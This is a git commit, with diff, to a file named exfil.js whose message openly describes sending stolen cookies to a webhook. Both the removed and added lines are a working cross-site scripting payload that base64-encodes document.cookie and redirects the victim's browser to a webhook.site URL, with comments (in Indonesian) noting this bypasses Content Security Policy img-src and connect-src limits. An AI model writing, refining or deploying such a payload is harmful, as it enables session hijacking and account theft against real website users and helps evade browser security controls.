8f894fd92762e580600b67880de9b09518dd3baf
Fauzi Ismail <mailvelous.career@gmail.com>
2026-01-01 06:54:38 +0700

    Refactor cookie exfiltration to use window.location
    Updated the method of sending stolen cookies to a webhook.

--- exfil.js
+++ exfil.js
@@ -1,5 +1,3 @@
-// Ambil cookie dan encode ke base64 biar aman di URL
-var stolenData = btoa(document.cookie);
-
-// Redirect user ke webhook Anda dengan membawa data
-window.location.href = "https://webhook.site/b74e2458-abe5-41bf-8319-55fe0e931aeb?c=" + stolenData;
+// Menggunakan window.location untuk bypass pembatasan img-src dan connect-src
+// Data akan dikirim sebagai query parameter 'c'
+window.location = "https://webhook.site/b74e2458-abe5-41bf-8319-55fe0e931aeb?c=" + btoa(document.cookie);
